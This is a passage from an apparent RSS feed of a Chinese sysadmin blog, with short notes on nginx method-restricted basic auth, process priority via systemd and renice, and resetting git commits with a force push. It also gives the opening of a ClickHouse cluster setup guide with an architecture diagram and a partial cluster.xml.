$&amp;gt; rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="nginx配置特定方法请求时进行密码认证"&gt;&lt;span&gt;nginx配置特定方法请求时进行密码认证&lt;/span&gt;
 &lt;a href="#nginx%e9%85%8d%e7%bd%ae%e7%89%b9%e5%ae%9a%e6%96%b9%e6%b3%95%e8%af%b7%e6%b1%82%e6%97%b6%e8%bf%9b%e8%a1%8c%e5%af%86%e7%a0%81%e8%ae%a4%e8%af%81" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt; # location 
 auth_basic &amp;#34;Registry realm&amp;#34;;
 # 指定除 HEAD 和 OPTIONS 方法外，其他方法都需要进行用户名/密码认证 
 # 注意： 此项设置在 docker registry 反向代理中可能不太适用，docker 在push的时候会先进行GET，如果GET没有要求认证
 # 则 docker 在push的时候就会不在携带用户名/密码校验，从而导致推送失败
 limit_except HEAD OPTIONS {
 auth_basic_user_file conf.d/.htpasswd;
 }&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="服务器资源不够导致的问题"&gt;&lt;span&gt;服务器资源不够导致的问题&lt;/span&gt;
 &lt;a href="#%e6%9c%8d%e5%8a%a1%e5%99%a8%e8%b5%84%e6%ba%90%e4%b8%8d%e5%a4%9f%e5%af%bc%e8%87%b4%e7%9a%84%e9%97%ae%e9%a2%98" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;   由于服务器上的&lt;code&gt;php&lt;/code&gt;站点经常受到攻击，于是决定重新调整环境架构，给上个开源&lt;code&gt;waf&lt;/code&gt;，部署一切正常，但是在站点正式运行的时，某个站点在访问一个查询页面时候，数据库的&lt;code&gt;cpu&lt;/code&gt;使用率消耗疯狂上涨(几百倍)，开始以为是站点被传木马了，一直疯狂查代码，查了很久发现，结果是服务器资源不够，停了一些站点重新分配了下每个容器的资源使用后，目前看起来稳定了，2核8G内存跑了近60个&lt;code&gt;php&lt;/code&gt;站点，不知道这是个什么水准的服务器，还是我太水优化不了😂😂😂。&lt;/p&gt;
&lt;h2 class="heading-element" id="通过systemd服务配置文件修改进程优先级"&gt;&lt;span&gt;通过&lt;code&gt;systemd&lt;/code&gt;服务配置文件修改进程优先级&lt;/span&gt;
 &lt;a href="#%e9%80%9a%e8%bf%87systemd%e6%9c%8d%e5%8a%a1%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e4%bf%ae%e6%94%b9%e8%bf%9b%e7%a8%8b%e4%bc%98%e5%85%88%e7%ba%a7" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;   在&lt;code&gt;[Service]&lt;/code&gt; 下添加 &lt;code&gt;Nice=-10&lt;/code&gt;。 &lt;code&gt;Nice&lt;/code&gt; 进程优先级，&lt;code&gt;-20&lt;/code&gt;-&lt;code&gt;19&lt;/code&gt;, 数字越小，优先级越高。 还可以直接修改已启动的进程的优先级 &lt;code&gt;sudo renice -n -10 -p &amp;lt;pid&amp;gt;&lt;/code&gt;。可以通过&lt;code&gt;sudo nice -n -10 &amp;lt;command&amp;gt;&lt;/code&gt; 直接在启动时指定&lt;/p&gt;
&lt;h2 class="heading-element" id="git-删除最近几次提交记录"&gt;&lt;span&gt;GIT 删除最近几次提交记录&lt;/span&gt;
 &lt;a href="#git-%e5%88%a0%e9%99%a4%e6%9c%80%e8%bf%91%e5%87%a0%e6%ac%a1%e6%8f%90%e4%ba%a4%e8%ae%b0%e5%bd%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 重置到指定提交 
$&amp;gt; git reset --hard &amp;lt;commit id&amp;gt;
# 重新提交当前修改内容 并提交 
$&amp;gt; git add . &amp;amp;&amp;amp; git comm -m &amp;#39;&amp;lt;message&amp;gt;&amp;#39;
# 强制重新推送到远程仓库 
$&amp;gt; git push --force origin main

# 如果报错，原因可能就是 远程仓库禁止 强制推送 
# 错误：无法推送一些引用到 xxxxxxxxx 

# 报错要修改就只能开分支然后在推送，最后其申请合并 &lt;/code&gt;&lt;/pre&gt;</description></item><item><title>clickhouse集群实践指南</title><link>https://blog.0x5c0f.cc/posts/linux/clickhouse%E9%9B%86%E7%BE%A4%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97/</link><pubDate>Wed, 17 Dec 2025 00:00:00 +0000</pubDate><author>mail@0x5c0f.cc (0x5c0f)</author><guid>https://blog.0x5c0f.cc/posts/linux/clickhouse%E9%9B%86%E7%BE%A4%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97/</guid><category domain="https://blog.0x5c0f.cc/categories/linux/">Linux</category><category domain="https://blog.0x5c0f.cc/categories/%E8%BF%90%E7%BB%B4%E8%AE%B0%E4%BA%8B/">运维记事</category><description>&lt;div class="details admonition info open"&gt;
 &lt;div class="details-summary admonition-title"&gt;&lt;i class="icon fa-fw fa-solid fa-circle-info" aria-hidden="true"&gt;&lt;/i&gt;信息&lt;i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"&gt;&lt;/i&gt;&lt;/div&gt;
 &lt;div class="details-content"&gt;
 &lt;div class="admonition-content"&gt;&lt;p&gt;当前测试环境:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Ubuntu 24.04&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ClickHouse server version 25.11.2.24 (official build)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
 &lt;/div&gt;
&lt;/div&gt;
&lt;h2 class="heading-element" id="1-写在前面这篇文章适合谁"&gt;&lt;span&gt;1. 写在前面：这篇文章适合谁？&lt;/span&gt;
 &lt;a href="#1-%e5%86%99%e5%9c%a8%e5%89%8d%e9%9d%a2%e8%bf%99%e7%af%87%e6%96%87%e7%ab%a0%e9%80%82%e5%90%88%e8%b0%81" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;✔ 第一次接触 ClickHouse 集群&lt;/li&gt;
&lt;li&gt;✔ 想从一开始就用“正确姿势”&lt;/li&gt;
&lt;li&gt;✔ 不想以后因为早期决策返工&lt;/li&gt;
&lt;li&gt;✔ 需要一份 &lt;strong&gt;可长期复用的模板&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;不适合&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;只想临时跑个 demo&lt;/li&gt;
&lt;li&gt;不关心扩容 / 高可用 / 运维&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="2-官方安装指南"&gt;&lt;span&gt;2. 官方安装指南&lt;/span&gt;
 &lt;a href="#2-%e5%ae%98%e6%96%b9%e5%ae%89%e8%a3%85%e6%8c%87%e5%8d%97" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://clickhouse.com/docs/zh/install" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://clickhouse.com/docs/zh/install&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 class="heading-element" id="3-clickhouse-集群的整体认知"&gt;&lt;span&gt;3. ClickHouse 集群的整体认知&lt;/span&gt;
 &lt;a href="#3-clickhouse-%e9%9b%86%e7%be%a4%e7%9a%84%e6%95%b4%e4%bd%93%e8%ae%a4%e7%9f%a5" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;在 &lt;code&gt;ClickHouse&lt;/code&gt; 中，&lt;code&gt;“集群”&lt;/code&gt;不是一个开关，而是&lt;strong&gt;一整套能力的组合&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;flowchart TB
 %% ================= 客户端 =================
 Client[&amp;#34;客户端&amp;lt;br/&amp;gt;INSERT / SELECT&amp;#34;]
 style Client fill:#4A90E2,color:#fff,stroke:#2C5AA0,stroke-width:2px

 %% ================= Distributed 表 =================
 DT[&amp;#34;Distributed 表&amp;lt;br/&amp;gt;统一访问入口 / 路由层&amp;#34;]
 style DT fill:#9B59B6,color:#fff,stroke:#6C3483,stroke-width:2px

 %% 客户端请求
 Client --&amp;gt;|写入请求 INSERT&amp;lt;br/&amp;gt;查询请求 SELECT| DT

 %% ================= 分片层 =================
 subgraph SHARDS[&amp;#34;ClickHouse 分片层&amp;#34;]
 direction LR
 style SHARDS fill:#F4F6F7,stroke:#95A5A6,stroke-width:2px

 subgraph S1[&amp;#34;Shard 1&amp;#34;]
 R11[&amp;#34;副本 1-1&amp;lt;br/&amp;gt;ReplicatedMergeTree&amp;#34;]
 R12[&amp;#34;副本 1-2&amp;lt;br/&amp;gt;ReplicatedMergeTree&amp;#34;]
 end

 subgraph S2[&amp;#34;Shard 2&amp;#34;]
 R21[&amp;#34;副本 2-1&amp;lt;br/&amp;gt;ReplicatedMergeTree&amp;#34;]
 R22[&amp;#34;副本 2-2&amp;lt;br/&amp;gt;ReplicatedMergeTree&amp;#34;]
 end

 subgraph S3[&amp;#34;Shard 3&amp;#34;]
 R31[&amp;#34;副本 3-1&amp;lt;br/&amp;gt;ReplicatedMergeTree&amp;#34;]
 R32[&amp;#34;副本 3-2&amp;lt;br/&amp;gt;ReplicatedMergeTree&amp;#34;]
 end
 end

 %% 副本样式
 style R11 fill:#2ECC71,color:#fff,stroke:#1E8449
 style R12 fill:#2ECC71,color:#fff,stroke:#1E8449
 style R21 fill:#2ECC71,color:#fff,stroke:#1E8449
 style R22 fill:#2ECC71,color:#fff,stroke:#1E8449
 style R31 fill:#2ECC71,color:#fff,stroke:#1E8449
 style R32 fill:#2ECC71,color:#fff,stroke:#1E8449

 %% 写入路由
 DT --&amp;gt;|按分片键路由写入数据| R11
 DT --&amp;gt;|按分片键路由写入数据| R21
 DT --&amp;gt;|按分片键路由写入数据| R31

 %% 副本复制
 R11 --&amp;gt;|异步复制（通过 Keeper 拉取增量 parts）| R12
 R21 --&amp;gt;|异步复制（通过 Keeper 拉取增量 parts）| R22
 R31 --&amp;gt;|异步复制（通过 Keeper 拉取增量 parts）| R32

 %% ================= Keeper =================
 subgraph KEEPERS[&amp;#34;ClickHouse Keeper 集群&amp;#34;]
 direction LR
 K1[&amp;#34;Keeper 节点 1&amp;lt;br/&amp;gt;元数据 / 复制日志&amp;#34;]
 K2[&amp;#34;Keeper 节点 2&amp;lt;br/&amp;gt;元数据 / 复制日志&amp;#34;]
 end


 style K1 fill:#F39C12,color:#fff,stroke:#B9770E,stroke-width:1px
 style K2 fill:#F39C12,color:#fff,stroke:#B9770E,stroke-width:1px

 %% Keeper 协调
 R11 &amp;lt;--&amp;gt;|注册副本 / 拉取复制日志| K1
 R12 &amp;lt;--&amp;gt;|注册副本 / 拉取复制日志| K1

 R21 &amp;lt;--&amp;gt;|注册副本 / 拉取复制日志| K2
 R22 &amp;lt;--&amp;gt;|注册副本 / 拉取复制日志| K2

 R31 &amp;lt;--&amp;gt;|注册副本 / 拉取复制日志| K1
 R32 &amp;lt;--&amp;gt;|注册副本 / 拉取复制日志| K2

 %% 查询返回
 R11 -.-&amp;gt;|返回本 Shard 查询结果| DT
 R21 -.-&amp;gt;|返回本 Shard 查询结果| DT
 R31 -.-&amp;gt;|返回本 Shard 查询结果| DT

 DT -.-&amp;gt;|汇总所有 Shard 结果并返回| Client

 %% ================= 线路颜色 =================
 %% 写入链路（红色）
 linkStyle 0 stroke:#E74C3C,stroke-width:2px
 linkStyle 1 stroke:#E74C3C,stroke-width:2px
 linkStyle 2 stroke:#E74C3C,stroke-width:2px
 linkStyle 3 stroke:#E74C3C,stroke-width:2px

 %% 副本复制（绿色）
 linkStyle 4 stroke:#27AE60,stroke-width:2px
 linkStyle 5 stroke:#27AE60,stroke-width:2px
 linkStyle 6 stroke:#27AE60,stroke-width:2px

 %% Keeper 协调（橙色）
 linkStyle 7 stroke:#F39C12,stroke-width:2px
 linkStyle 8 stroke:#F39C12,stroke-width:2px
 linkStyle 9 stroke:#F39C12,stroke-width:2px
 linkStyle 10 stroke:#F39C12,stroke-width:2px
 linkStyle 11 stroke:#F39C12,stroke-width:2px
 linkStyle 12 stroke:#F39C12,stroke-width:2px

 %% 查询链路（蓝色虚线）
 linkStyle 13 stroke:#3498DB,stroke-width:2px,stroke-dasharray:5 5
 linkStyle 14 stroke:#3498DB,stroke-width:2px,stroke-dasharray:5 5
 linkStyle 15 stroke:#3498DB,stroke-width:2px,stroke-dasharray:5 5
 linkStyle 16 stroke:#3498DB,stroke-width:2px,stroke-dasharray:5 5&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;记住一句话&lt;/strong&gt;：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;ClickHouse&lt;/code&gt; 的高可用 = &lt;code&gt;数据可复制&lt;/code&gt; + &lt;code&gt;元数据不丢&lt;/code&gt; + &lt;code&gt;访问不中断&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="4-为什么单节点也要用集群模式初始化"&gt;&lt;span&gt;4. 为什么“单节点也要用集群模式初始化”&lt;/span&gt;
 &lt;a href="#4-%e4%b8%ba%e4%bb%80%e4%b9%88%e5%8d%95%e8%8a%82%e7%82%b9%e4%b9%9f%e8%a6%81%e7%94%a8%e9%9b%86%e7%be%a4%e6%a8%a1%e5%bc%8f%e5%88%9d%e5%a7%8b%e5%8c%96" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="41-常见误区"&gt;&lt;span&gt;4.1. 常见误区&lt;/span&gt;
 &lt;a href="#41-%e5%b8%b8%e8%a7%81%e8%af%af%e5%8c%ba" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;“现在只有一台机器，用单机模式更简单吧？”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;这是 ClickHouse 中最容易留下技术债的决定。&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 class="heading-element" id="42-正确做法推荐"&gt;&lt;span&gt;4.2. 正确做法（推荐）&lt;/span&gt;
 &lt;a href="#42-%e6%ad%a3%e7%a1%ae%e5%81%9a%e6%b3%95%e6%8e%a8%e8%8d%90" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;即使只有 &lt;strong&gt;1 台机器&lt;/strong&gt;，也要：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;配置 &lt;a href="#5-%e9%9b%86%e7%be%a4%e9%85%8d%e7%bd%aeclusterxml"&gt;&lt;code&gt;cluster.xml&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;配置 &lt;a href="#62-keeperxml%e6%9c%80%e5%b0%8f%e5%8f%af%e7%94%a8%e5%8d%95%e8%8a%82%e7%82%b9"&gt;&lt;code&gt;keeper.xml&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;配置 &lt;a href="#82-%e9%ab%98%e5%8f%af%e7%94%a8%e7%89%88%e6%9c%ac%e6%8e%a8%e8%8d%90%e7%94%9f%e4%ba%a7"&gt;&lt;code&gt;macros.xml&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;配置 &lt;a href="https://blog.0x5c0f.cc/posts/linux/clickhouse%e6%9d%83%e9%99%90%e4%b8%8e%e8%ae%bf%e9%97%ae%e6%8e%a7%e5%88%b6%e8%ae%be%e8%ae%a1#12-%e7%94%a8%e6%88%b7%e6%9d%83%e9%99%90%e5%90%8c%e6%ad%a5"&gt;&lt;code&gt;replicated_access.xml&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;所有 DDL 使用 &lt;code&gt;ON CLUSTER&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;所有的表都使用 &lt;code&gt;ReplicatedMergeTree&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原因：&lt;/p&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;好处&lt;/th&gt;
 &lt;th&gt;解释&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;表结构不返工&lt;/td&gt;
 &lt;td&gt;以后加节点不用重建&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;用法统一&lt;/td&gt;
 &lt;td&gt;单机 / 集群 SQL 一样&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;符合 25.x 设计&lt;/td&gt;
 &lt;td&gt;ON CLUSTER 强依赖 Keeper&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="5-集群配置clusterxml"&gt;&lt;span&gt;5. 集群配置：cluster.xml&lt;/span&gt;
 &lt;a href="#5-%e9%9b%86%e7%be%a4%e9%85%8d%e7%bd%aeclusterxml" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- /etc/clickhouse-server/config.d/cluster.xml --&amp;gt;
&amp;lt;clickhouse&amp;gt;
 &amp;lt;!-- 强制指定 ClickHouse 使用IP进行注册 --&amp;gt;
 &amp;lt;interserver_http_host&amp;gt;172.31.10.12&amp;lt;/interserver_http_host&amp;gt;
 &amp;lt;remote_servers&amp;gt;
 &amp;lt;!-- 集群名称，后续 SQL 会用到 --&amp;gt;
 &amp;lt;default_cluster&amp;gt;
 &amp;lt;!-- shard：数据分片
 shard 数量 = 数据水平切分的数量
 一个 shard 可以包含多个 replica（副本节点） --&amp;gt;
 &amp;lt;shard&amp;gt;
 &amp;lt;!-- 决定数据是如何在副本之间&amp;#34;流动&amp;#34;, 配合 ReplicatedMergeTree 的时候必须设置为 true --&amp;gt;
 &amp;lt;internal_replication&amp;gt;true&amp;lt;/internal_replication&amp;gt;
 &amp;lt;!-- replica：副本 --&amp;gt;
 &amp;lt;replica&amp;gt;
 &amp;lt;host&amp;gt;172.31.10.12&amp;lt;/host&amp;gt;
 &amp;lt;port&amp;gt;9000&amp;lt;/port&amp;gt;
